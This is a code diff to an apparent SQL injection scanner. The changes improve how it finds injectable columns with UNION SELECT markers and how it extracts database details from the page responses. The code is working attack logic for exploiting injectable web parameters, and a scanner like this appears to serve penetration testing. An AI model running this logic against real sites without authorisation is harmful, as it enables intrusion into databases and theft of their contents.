@@ -1044,8 +1044,20 @@ class SQLiScanner:
         
         # Step 2: Find injectable columns with UNION SELECT (using the working prefix/suffix)
         null_list = ["NULL"] * column_count
-        marker = f"0x{random.randint(100000, 999999):x}"
+        # Use an ASCII marker string so it appears as readable text in UNION output.
+        # Convert to hex literal for MySQL: 0x4d534331323334 → "MSC1234" when evaluated.
+        marker_plain = f"msc{random.randint(10000, 99999)}"
+        marker = f"0x{marker_plain.encode().hex()}"
         injectable_cols = []
+        
+        def _marker_reflected_not_in_error(body_text: str) -> bool:
+            """Check if marker appears in the response body but NOT only inside error messages."""
+            if not body_text or marker_plain not in body_text:
+                return False
+            # Strip out SQL error messages to see if marker still appears
+            import re as _re
+            cleaned = _re.sub(r'(?i)(error|warning|notice)[:\s].{0,500}', '', body_text)
+            return marker_plain in cleaned
         
         # Determine if numeric-style injection (prefix replaces original value)
         is_numeric_prefix = working_style in ("numeric", "float_bare", "parenthesis")
@@ -1066,7 +1078,7 @@ class SQLiScanner:
             
             test_url = self._build_url(base, test_params)
             body, _ = await self._fetch(test_url, session)
-            if body and marker.replace("0x", "") in body:
+            if _marker_reflected_not_in_error(body):
                 injectable_cols.append(col_idx)
         
         if not injectable_cols:
@@ -1090,7 +1102,7 @@ class SQLiScanner:
                     
                     test_url = self._build_url(base, test_params)
                     body, _ = await self._fetch(test_url, session)
-                    if body and marker.replace("0x", "") in body:
+                    if _marker_reflected_not_in_error(body):
                         injectable_cols.append(col_idx)
                 
                 if injectable_cols:
@@ -1147,8 +1159,10 @@ class SQLiScanner:
             ],
         }
         
-        unique_start = f"0x{random.randint(100000, 999999):x}"
-        unique_end = f"0x{random.randint(100000, 999999):x}"
+        unique_start_plain = f"mds{random.randint(10000, 99999)}"
+        unique_end_plain = f"mde{random.randint(10000, 99999)}"
+        unique_start = f"0x{unique_start_plain.encode().hex()}"
+        unique_end = f"0x{unique_end_plain.encode().hex()}"
         
         for query, attr in info_queries.get(dbms, info_queries["mysql"]):
             test_cols = null_list.copy()
@@ -1169,9 +1183,7 @@ class SQLiScanner:
             
             body, _ = await self._fetch(test_url, session)
             if body:
-                start_hex = unique_start.replace("0x", "")
-                end_hex = unique_end.replace("0x", "")
-                match = re.search(rf"{start_hex}\|(.+?)\|{end_hex}", body)
+                match = re.search(rf"{re.escape(unique_start_plain)}\|(.+?)\|{re.escape(unique_end_plain)}", body)
                 if match:
                     setattr(result, attr, match.group(1))
                     logger.info(f"Extracted {attr}: {match.group(1)}")
